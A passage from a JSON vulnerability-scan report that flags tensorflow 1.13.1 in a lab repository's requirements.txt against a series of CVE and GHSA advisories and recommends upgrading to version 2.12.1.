            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23585 (severity: medium, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23585](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23585)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "261850bef19736279495bebaa4552f9602493e43"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23581",
          "ruleIndex": 303,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23581 (severity: medium, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23581](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23581)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "9586af641593bb9b8fc47f5d2c9702514967cd69"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-21737",
          "ruleIndex": 304,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-21737 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-21737](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21737)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "619843ecf21f366723e34060c2d7a77b32758dbd"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-21735",
          "ruleIndex": 305,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-21735 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-21735](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21735)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c565c0cf7c86fab7cdbe1673483877b6749503b9"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-21736",
          "ruleIndex": 306,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-21736 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-21736](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21736)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "9fd24e6d99966fb4cfda98ebb72431d303ed17f4"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-21732",
          "ruleIndex": 307,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-21732 (severity: medium, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-21732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21732)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ee40f2b711d38112713ad3853b6bf5ac4afc98ba"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23560",
          "ruleIndex": 308,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23560 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23560](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23560)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e467c43f36dd3459f63d1ce09c38dc18422ecef1"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-21725",
          "ruleIndex": 309,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-21725 (severity: medium, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-21725](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21725)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "353a48e1a06e99f81eeb156aa0fe6c3549f7aaee"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23591",
          "ruleIndex": 310,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23591 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23591](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23591)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "b0dcb363edac922c36d559477e5b840db49619e6"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-21729",
          "ruleIndex": 311,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-21729 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-21729](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21729)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "cece0cea5e64f161da0ac590232b6111d6556b27"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23567",
          "ruleIndex": 312,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23567 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23567](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23567)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "a6131170933022a4a50816d6ad7a084619babc4c"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "GHSA-h6gw-r52c-724r",
          "ruleIndex": 313,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability GHSA-h6gw-r52c-724r (severity: critical, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [GHSA-h6gw-r52c-724r](https://github.com/advisories/GHSA-h6gw-r52c-724r)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "0776121fc28f50bdd9d7100ca6b033cec12dbfba"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23557",
          "ruleIndex": 314,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23557 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23557](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23557)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "d5513dc3314c883c4a1021d49fa21a697905ca9b"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-21726",
          "ruleIndex": 315,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-21726 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-21726](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21726)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e2305ff2684f5137551282c95c10f542bccbfdc6"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23573",
          "ruleIndex": 316,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23573 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23573](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23573)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c35e821669a7a127bd239e5fdf6d4e44e4049fbf"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23575",
          "ruleIndex": 317,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23575 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23575](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23575)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "567f98302439d4c92954a7834755d5f61ff8ab3b"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23586",
          "ruleIndex": 318,
          "level": "warning",
          "message": {
